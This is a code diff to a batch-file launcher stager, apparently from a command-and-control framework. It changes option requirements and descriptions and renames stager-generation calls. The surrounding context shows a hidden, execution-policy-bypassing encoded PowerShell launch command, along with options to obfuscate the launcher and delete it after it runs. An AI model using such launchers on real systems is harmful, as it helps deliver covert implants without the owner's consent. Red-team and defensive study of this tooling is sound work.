@@ -38,18 +38,18 @@ class Stager:
             },
             "OutFile": {
                 "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
-                "Required": False,
+                "Required": True,
                 "Value": "launcher.bat",
             },
             "Delete": {
-                "Description": "Switch. Delete .bat after running.",
+                "Description": "Delete .bat after running.",
                 "Required": False,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
                 "Strict": True,
             },
             "Obfuscate": {
-                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                 "Required": False,
                 "Value": "False",
                 "SuggestedValues": ["True", "False"],
@@ -122,7 +122,7 @@ class Stager:
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {launcher_ps}"
 
             else:
-                oneliner = self.mainMenu.stagers.generate_exe_oneliner(
+                oneliner = self.mainMenu.stagergenv2.generate_exe_oneliner(
                     language=language,
                     obfuscate=obfuscate,
                     obfuscation_command=obfuscate_command,
@@ -132,8 +132,8 @@ class Stager:
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
 
         elif language == "powershell":
-            launcher = self.mainMenu.stagers.generate_launcher(
-                listenerName=listener_name,
+            launcher = self.mainMenu.stagergenv2.generate_launcher(
+                listener_name=listener_name,
                 language="powershell",
                 encode=True,
                 obfuscate=obfuscate,
